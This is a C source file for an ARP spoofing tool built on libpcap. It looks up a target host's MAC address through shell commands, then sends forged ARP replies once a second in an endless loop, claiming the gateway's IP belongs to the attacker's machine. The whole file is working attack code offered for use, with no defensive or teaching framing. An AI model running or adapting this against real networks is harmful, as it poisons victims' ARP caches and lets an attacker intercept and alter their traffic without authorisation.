#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h> 
#include <pcap.h>       
#include <string.h>
#include <unistd.h>    
#include <netinet/ether.h>
#include <arpa/inet.h>

int  IPtoMAC(const char *dev, const struct in_addr IP, struct ether_addr *MAC);
void init_pcd(pcap_t **pcd, char **dev);
void getMyAddress(const char *dev, struct in_addr *myIP, struct ether_addr *myMAC);
void getGateway(const char *dev, struct in_addr *gateway);
void sendARP(pcap_t *pcd, const struct in_addr dstIP, const struct ether_addr dstMAC, const struct in_addr srcIP, const struct ether_addr srcMAC);


int main(int argc, char **argv)
{
	pcap_t *pcd;
	char *dev;

	struct in_addr myIP, dstIP, gateway;
	struct ether_addr myMAC, dstMAC;

	init_pcd(&pcd, &dev);

	if (inet_aton(argv[1], &dstIP) == 0)
	{
		printf("Error: invalid IP : %s \n", argv[1]);
		exit(1);
	}
	if (IPtoMAC(dev, dstIP, &dstMAC) == -1)
	{
		printf("Error: given IP(%s) is not in the ARP table.\n", argv[1]);
		exit(1);
	}
	
	getMyAddress(dev, &myIP, &myMAC);
	getGateway(dev, &gateway);

	printf("START ARP SPOOFING\n");
	sendARP(pcd, dstIP, dstMAC, gateway, myMAC);

	return 0;
}



void sendARP(pcap_t *pcd, const struct in_addr dstIP, const struct ether_addr dstMAC, const struct in_addr srcIP, const struct ether_addr srcMAC)
{
    const int ETHER_LEN = sizeof(struct ether_header);
    const int ARP_LEN   = sizeof(struct ether_arp);
    u_char packet[ETHER_LEN + ARP_LEN];
    struct ether_header etherHdr;
    struct ether_arp arpHdr;

    // Ethernet part
    etherHdr.ether_type = htons(ETHERTYPE_ARP);
    memcpy(etherHdr.ether_dhost, &dstMAC.ether_addr_octet, ETHER_ADDR_LEN);
    memcpy(etherHdr.ether_shost, &srcMAC.ether_addr_octet, ETHER_ADDR_LEN);

    // ARP part
    arpHdr.arp_hrd = htons(ARPHRD_ETHER);
    arpHdr.arp_pro = htons(ETHERTYPE_IP);
    arpHdr.arp_hln = ETHER_ADDR_LEN;
    arpHdr.arp_pln = sizeof(in_addr_t);
    arpHdr.arp_op  = htons(ARPOP_REPLY);
 
	memcpy(&arpHdr.arp_sha, &srcMAC.ether_addr_octet, ETHER_ADDR_LEN);
    memcpy(&arpHdr.arp_spa, &srcIP.s_addr, sizeof(in_addr_t));
    memcpy(&arpHdr.arp_tha, &dstMAC.ether_addr_octet, ETHER_ADDR_LEN);
    memcpy(&arpHdr.arp_tpa, &dstIP.s_addr, sizeof(in_addr_t));

    memcpy(packet, &etherHdr, ETHER_LEN);
    memcpy(packet+ETHER_LEN, &arpHdr, ARP_LEN);

    while(1)
    {
        if(pcap_inject(pcd,packet,sizeof(packet))==-1)
        {
            pcap_perror(pcd,0);
            pcap_close(pcd);
            exit(1);
        }
        sleep(1);
    }

    return;
}


void init_pcd(pcap_t **pcd, char **dev)
{
    char errbuf[PCAP_ERRBUF_SIZE];

    *dev = pcap_lookupdev(errbuf);

    if(dev == NULL)
    {
        printf("%s\n",errbuf);
        exit(1);
    }
    
    *pcd = pcap_open_live(*dev, BUFSIZ,  1, -1, errbuf);

    if (*pcd == NULL)
    {
        printf("%s\n", errbuf);
        exit(1);
    }

    return;
}


void getGateway(const char *dev, struct in_addr *gateway)
{
    FILE* fp;
    char cmd[256] = {0x0};
    char IPbuf[20] = {0x0};

    sprintf(cmd,"route -n | grep '%s'  | grep 'UG' | awk '{print $2}'", dev);
    
    fp = popen(cmd, "r");
    fgets(IPbuf, sizeof(IPbuf), fp);
    pclose(fp);

    inet_aton(IPbuf, gateway);

    return;
}

void getMyAddress(const char *dev, struct in_addr *myIP, struct ether_addr *myMAC)
{
    FILE* fp;
    char cmd[256] = {0x0};
    char MACbuf[20] = {0x0}, IPbuf[20] = {0x0};
       
    sprintf(cmd,"ifconfig | grep '%s' | awk '{print $5}'", dev);
    
    fp = popen(cmd, "r");
    fgets(MACbuf, sizeof(MACbuf), fp);
    pclose(fp);

    ether_aton_r(MACbuf, myMAC);

    sprintf(cmd,"ifconfig | grep -A 1 '%s' | grep 'inet addr' | awk '{print $2}' | awk -F':' '{print $2}'", dev);
    
    fp = popen(cmd, "r");
    fgets(IPbuf, sizeof(IPbuf), fp);
    pclose(fp);

    inet_aton(IPbuf, myIP);

    return;
}

int IPtoMAC(const char *dev, const struct in_addr IP, struct ether_addr *MAC)
{
    FILE* fp;
    char cmd[256] = {0x0};
    char IPbuf[20] = {0x0}, MACbuf[20] = {0x0};

    inet_ntop(AF_INET, &IP, IPbuf, sizeof(IPbuf));


    sprintf(cmd, "ping -c 1 %s > /dev/null", IPbuf);
    system(cmd);
    sprintf(cmd,"arp | grep '%s' | grep '%s' | awk '{print $3}'", dev, IPbuf);
    fp = popen(cmd, "r");
    fgets(MACbuf, sizeof(MACbuf), fp);
    pclose(fp);

    if(strlen(MACbuf)<5) 
        return -1;

    ether_aton_r(MACbuf, MAC);

    return 0;
}

